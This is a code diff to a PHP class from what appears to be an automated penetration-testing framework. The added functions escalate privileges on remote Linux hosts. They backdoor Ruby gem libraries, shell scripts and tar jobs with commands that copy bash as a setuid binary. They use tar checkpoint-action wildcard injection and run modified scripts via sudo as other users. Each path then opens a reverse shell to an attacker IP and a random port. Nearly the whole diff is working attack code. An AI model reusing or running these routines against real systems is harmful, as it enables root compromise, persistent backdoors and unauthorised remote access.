@@ -532,7 +532,7 @@ EOC;
             $query = "echo '$seteuid' > /tmp/seteuid_id_$this->uid_name.c";
             $this->lan2stream4result($query,$this->stream_timeout);
             $query = "gcc -o /tmp/seteuid_id_$this->uid_name /tmp/seteuid_id_$this->uid_name.c && chmod 6777 /tmp/seteuid_id_$this->uid_name ";
-            $data = str_replace("%ID%","\"$query\"", $template_id);
+            $data = str_replace("%ID%","$query", $template_id);
             $this->lan2stream4result($data,$this->stream_timeout);
             $data = str_replace("%ID%", "/tmp/seteuid_id_$this->uid_name", $template_id);
             $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
@@ -662,13 +662,35 @@ EOC;
     }
   
 
-    public function lan2file4exist($filename){
+    public function lan2file4exist8name($filename){
         $this->ssTitre(__FUNCTION__);
         $filepath = $this->lan2file4locate($filename);
         if (!empty($filepath)){
             return TRUE;
         }
         ELSE return FALSE;
+    }
+    
+    
+    public function lan2file4exist8path($filepath){
+        $this->ssTitre(__FUNCTION__);
+        $tmp2 = array();
+        $filepath_found = "";
+        $data = "ls -al $filepath";
+        $tmp = $this->lan2stream4result($data, $this->stream_timeout);
+        exec("echo '$tmp' | awk '{print $9}' $this->filter_file_path ",$tmp2);
+        
+        if (isset($tmp2[0])) $filepath_found = $tmp2[0];
+        if (!empty($filepath_found)){
+            $chaine = "file exist";
+            $this->note($chaine);
+            return TRUE;
+        }
+        else {
+            $chaine = "file does not exist";
+            $this->rouge($chaine);
+            return FALSE;
+        }
     }
     
     
@@ -702,7 +724,7 @@ EOC;
         $this->ssTitre(__FUNCTION__);
         $search_data = trim($search_data);
         $obj_filename = new FILE($filename);
-        if($this->lan2file4writable($obj_filename->file_path)){
+        
             $data = "cat $obj_filename->file_path";
             $lines = $this->lan2stream4result($data,$this->stream_timeout);
             $lines_tab = explode("\n", $lines);
@@ -715,32 +737,239 @@ EOC;
                 }
                 
             }
-        }
+        
         $this->article("Searching", "Not Found");
         return FALSE;
     }
     
     
-    public function lan2file4add($filename,$add_data){
+    public function lan2file2backdoor($lan_filepath){
+        $obj_exec = new FILE($lan_filepath);
+        
+        $data = "file $obj_exec->file_path";
+        $file_info = $this->lan2stream4result($data,$this->stream_timeout);
+        // if ($this->lan2file4writable($obj_jobs->file_path)){
+        
+        if ( $this->lan2file4exist8path($lan_filepath) ){
+        switch ($file_info) {
+            // Bourne-Again shell script, ASCII text executable
+            case (strstr($file_info,"Bourne-Again shell script, ASCII text executable")!==FALSE) :
+                $this->lan2file2backdoor4ascii4bash($lan_filepath);
+                
+                break;
+                
+                
+            case (strstr($file_info,"Ruby script, ASCII text executable")!==FALSE) :
+                $this->lan2file2backdoor4ruby($lan_filepath);
+                break;
+            
+                
+            case (strstr($file_info,"tar, ")!==FALSE) :
+                $this->lan2file2backdoor4ascii4tar($lan_filepath);
+                break;
+                
+            case (strstr($file_info,"ASCII text")!==FALSE) :
+                $this->lan2file2backdoor4ascii4bash($lan_filepath);
+                break;
+                
+            default:
+                break;
+        }
+        }
+    }
+    
+    
+    
+    
+    
+    public function lan2file2backdoor4ruby($lan_filepath){
         $result = "";
-        $result .= $this->ssTitre(__FUNCTION__);
+        $this->ssTitre(__FUNCTION__);
+        $obj_jobs = new FILE($lan_filepath);
+        $data = "cat $obj_jobs->file_path | grep -i require ";
+        $source_code = $this->lan2stream4result($data,$this->stream_timeout);
+        $query = "echo \"$source_code\" | grep -i require | awk '{print $2}' | grep -Po \"[0-9a-z\_\-/]{1,}\" ";
+        $libs = array();
+        exec($query,$libs);
+        
+        //$libs = array("zip");
+        
+        foreach ($libs as $lib){
+            $lib = trim($lib);
+            if (!empty($lib)){
+                $hashname = sha1($lib);
+                
+                $data = "gem which $lib  | grep '/'";
+                $rst_tmp = $this->lan2stream4result($data,$this->stream_timeout);
+                $query = "echo \"".addslashes($rst_tmp)."\" | grep '/' | grep -Po \"^/[[:print:]]{1,}\" ";
+                $tmp = array();
+                exec($query,$tmp);
+                $lib_path = $tmp[0];
+                
+                $this->article("LIB", $lib);
+                $this->article("LIB PATH", $lib_path);
+                //var_dump($tmp);fgets(STDIN);
+                $this->pause();
+                
+                $data = "ls -al $lib_path";
+                $this->lan2stream4result($data,$this->stream_timeout);
+                $data = "chmod 777 $lib_path";
+                $this->lan2stream4result($data,$this->stream_timeout);
+                $data = "ls -al $lib_path";
+                $this->lan2stream4result($data,$this->stream_timeout);
+                $data = "ls -al /tmp/";
+                $this->lan2stream4result($data,$this->stream_timeout);
+                $data = "echo '`cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname`' > $lib_path";
+                //$data = "echo '$(cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname)' > $lib_path";
+                $this->lan2stream4result($data,$this->stream_timeout);
+                if (strstr($minute, "*")) $seconds = "60";
+                else $seconds = $minute;
+                $this->article("Wait Seconds", $seconds);
+                
+                sleep($seconds);
+                $this->pause();
+                
+                $data = "ls -al /tmp/";
+                $this->lan2stream4result($data,$this->stream_timeout);
+                $data = "ls -al /tmp/$hashname";
+                $this->lan2stream4result($data,$this->stream_timeout);
+                $data = "/tmp/$hashname -p -c id";
+                $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
+                $this->pause();
+                if (strstr($rst_id, "euid=")) {
+                    $template_id = "/tmp/$hashname -p -c %ID%";
+                    $templateB64_id = base64_encode($template_id);
+                    $template_id_new = $this->lan2spawn2shell8euid($template_id);
+                    
+                    $attacker_ip = $this->ip4addr4target($this->ip);
+                    $attacker_port = rand(1024,65535);
+                    //$attacker_port = 7777;
+                    $shell = "/bin/bash";
+                    $this->lan2pentest8id($template_id_new,$attacker_ip,$attacker_port,$shell);
+                    
+                }
+                
+                
+                
+            }
+        }
+    }
+    
+    public function lan2file2backdoor4ascii4tar($lan_filepath){
+        $result = "";
+        $this->ssTitre(__FUNCTION__);
+        $lan_filepath = trim($lan_filepath);
+        $obj_jobs = new FILE($lan_filepath);
+        
+        $data = "file $obj_jobs->file_path";
+        $this->lan2stream4result($data,$this->stream_timeout);
+        // if ($this->lan2file4writable($obj_jobs->file_path)){
+        $query = " | strings | grep \"tar\" | grep -Po \"tar \"";
+        $check = $this->lan2stream4result("cat $obj_jobs->file_path $query ",$this->stream_timeout);
+        $check_tar = exec("echo '$check' $query ");
+        
+        if (!empty($check_tar)){
+            $sha1_hash = sha1($obj_jobs->file_path);
+            $template_id_test = "echo  \"%ID%\" > /tmp/$sha1_hash.sh && echo \"\" > \"--checkpoint-action=exec=sh /tmp/$sha1_hash.sh\" && echo \"\" > --checkpoint=1";
+            $attacker_ip = $this->ip4addr4target($this->ip);
+            $attacker_port = rand(1024,65535);
+            //$attacker_port = 7777;
+            $shell = "/bin/bash";
+            $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
+            $this->pause();
+        }
+    }
+    
+    public function lan2file2backdoor4ascii4bash($lan_filepath){
+        $this->ssTitre(__FUNCTION__);
+        $lan_filepath = trim($lan_filepath);
+        $obj_jobs = new FILE($lan_filepath);
+        
+        $data = "file $obj_jobs->file_path";
+        $this->lan2stream4result($data,$this->stream_timeout);
+        
+        $this->lan2stream4result("cat $obj_jobs->file_path",$this->stream_timeout);
+        
+        $tab_users_shell = $this->ip2users4shell();
+        foreach ($tab_users_shell as $username){
+            //sleep($minute*60);
+            if (!$this->ip2root8db($this->ip2id)){
+            $template_id_test = "echo '%ID%' > $obj_jobs->file_path && sudo -u $username $obj_jobs->file_path";
+            $attacker_ip = $this->ip4addr4target($this->ip);
+            $attacker_port = rand(1024,65535);
+            //$attacker_port = 7777;
+            $shell = "/bin/bash";
+            $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
+            $this->pause();
+            }
+        }
+    }
+    
+    public function lan2file2backdoor4ascii4bash2rm($lan_filepath){
+        $this->ssTitre(__FUNCTION__);
+        $lan_filepath = trim($lan_filepath);
+        $obj_jobs = new FILE($lan_filepath);
+        
+        $data = "file $obj_jobs->file_path";
+        $this->lan2stream4result($data,$this->stream_timeout);
+        
+        $this->lan2stream4result("cat $obj_jobs->file_path",$this->stream_timeout);
+        
+        $tab_users_shell = $this->ip2users4shell();
+        foreach ($tab_users_shell as $username){
+        //sleep($minute*60);
+        $sha1_hash = sha1($obj_jobs->file_path.$username);
+            
+        $data = "cp /bin/bash /tmp/$sha1_hash && chmod 6777 /tmp/$sha1_hash";
+        $this->lan2file4add($obj_jobs->file_path, $data);
+        $this->pause();
+            
+        $data = "sudo -u $username $obj_jobs->file_path";
+        $this->lan2stream4result($data,$this->stream_timeout);
+       
+        if ($this->lan2file4exist8path("/tmp/$sha1_hash")){
+        $data = "ls -al /tmp/$sha1_hash ";
+        $this->lan2stream4result($data,$this->stream_timeout);
+        $template_id_test = "/tmp/$sha1_hash -p -c '%ID%'";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        //$attacker_port = 7777;
+        $shell = "/bin/bash";
+        $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
+        $this->pause();
+        $data = "rm -v /tmp/$sha1_hash ";
+        $this->lan2stream4result($data,$this->stream_timeout);
+        }
+        
+        }
+    }
+    
+    
+    public function lan2file4add($filename,$add_data){
+        $this->ssTitre(__FUNCTION__);
         $obj_filename = new FILE($filename);
         
         if ($this->lan2file4search($obj_filename->file_path, $add_data)){
-            $result .=  $this->note("Already Added: $add_data");
+            $this->note("Already Added: $add_data");
+            return TRUE;
         }
         else {
-            $result .=  $this->note("ADD: $add_data");
-            $result .=  $this->lan2stream4result("echo '$add_data' >> $obj_filename->file_path");
+            $this->note("ADD: $add_data");
+            $this->lan2stream4result("echo '$add_data' >> $obj_filename->file_path",$this->stream_timeout);
+            $data = "cat $obj_filename->file_path";
+            $tmp = $this->lan2stream4result($data,$this->stream_timeout);
+            exec("echo '$tmp' | grep -Po '$add_data'  ",$rst);
+            if (strstr($rst[0], $add_data)) {$this->log2succes("SUCCES ADD: $add_data",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");return TRUE;}
+            else {$this->log2error("Failed ADD",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");return FALSE;}
         }
-        $data = "grep '$add_data' $obj_filename->file_path | grep -Po '$add_data' ";
-        $this->lan2stream4result($data,$this->stream_timeout);
-        return $result;
+
     }
     
     
     public function lan2file4writable($filename){
         $this->ssTitre(__FUNCTION__);
+        $writable_rst = array();
+        if ($this->lan2file4exist8path($filename)){
         $data = "stat $filename";
         $writable_test = trim($this->lan2stream4result($data,$this->stream_timeout));
         if (preg_match('/[0-7]{3}(?<user2write>[0-7]{1})\/[rwx\-]{7}/',$writable_test,$writable_rst))
@@ -755,9 +984,11 @@ EOC;
         }
         else {$this->note("Not Writeable $filename");return FALSE;}
     }
+    }
     
     public function lan2file4readable($filename){
         $this->ssTitre(__FUNCTION__);
+        $readable_rst = array();
         $data = "stat $filename";
         $readable_test = trim($this->lan2stream4result($data,$this->stream_timeout));
         if (preg_match('/[0-7]{3}(?<user2read>[0-7]{1})\/[rwx\-]{7}/',$readable_test,$readable_rst))
